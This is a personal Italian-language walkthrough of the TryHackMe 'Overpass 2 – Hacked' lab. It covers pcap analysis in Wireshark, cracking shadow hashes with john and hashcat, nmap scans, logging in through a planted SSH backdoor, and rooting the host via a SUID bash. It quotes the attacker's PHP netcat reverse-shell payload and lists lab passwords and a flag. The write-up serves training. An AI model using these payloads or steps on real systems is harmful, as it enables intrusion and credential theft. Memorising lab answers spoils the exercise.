
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/overpass2hacked

scarichiamo il file overpass2_1595383502269.pcapng

```
wireshark
```
importiamo il file
alla quarta riga abbiamo una petizione GET
Tasto dx e Follow>TCP Stream
e troviamo URL adoperata GET /development/ HTTP/1.1
```
/development/
```
alla riga 14 troviamo una petizione POST
Tasto dx e Follow>TCP Stream
e troviamo un comando di reverse shell
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
seguiamo poi dalla riga 32 troviamo varie cose 

troviamo la password utilizzata
```
whenevernoteartinstant
```
e la backdoor utilizzata per la persistenza

```
git clone https://github.com/NinjaJc01/ssh-backdoor
```
prendiamo le password estratte e vediamo quante  sono craccabili
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::

paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::

szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::

bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::

muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
le mettiamo dentro ad un file
```
nano password
```
vediamo se abbiamo il dizionario
```
locate fasttrack
```
e utilizziamo john

```
john --wordlist=/usr/share/wordlists/fasttrack.txt password
```

==troviamo 4 password craccabili!==
ora ci facciamo il clone 
```
git clone https://github.com/NinjaJc01/ssh-backdoor
```
ed andiamo a trovare hash dentro il file main.go
```
nano main.go
```
 hash trovato
```
"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```
What's the hardcoded ==salt== for the backdoor?
```
return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
```

salt: 1c362db832f3f864c8c2fe05f2002a05
==ora cerchiamo hash che ha utilizzato l'attaccante==
==ha il parametro -a o --hash==
```
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
e la cracchiamo con rockyou mettiamo -m 1710 è tipo di sha trovato

hashcat -m 1710 "hash:salt" percorso/rockyou
```
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" /usr/share/wordlists/rockyou.txt
```

la password trovata è:
```
november16
```

```
sudo openvpn ~/Downloads/damaranto.ovpn
```

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.150.100 -oG risultatoscan
```

```
sudo nmap -sC -sV -p80,22,2222 10.10.150.100 -oN risultatoscan2
```

http://10.10.150.100/
sulla pagina web troviamo
```
H4ck3d by CooctusClan
```

```
ssh james@10.10.150.100 -p2222 -oHostKeyAlgorithms=+ssh-rsa
```
mettiamo la password november16

```
cd ..
```

```
cat user.txt
```

```
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

```
ls -al
```

troviamo ==.suid_bash== rosso con i permessi di esecuzione root

```
./.suid_bash -p
```
	(-p di persistenza per mantenere i parametri di root)

```
whoami
```

```
cd /root
```

```
cat root.txt
```

```
thm{xxxxxxxxxxxxxxxxxx}
```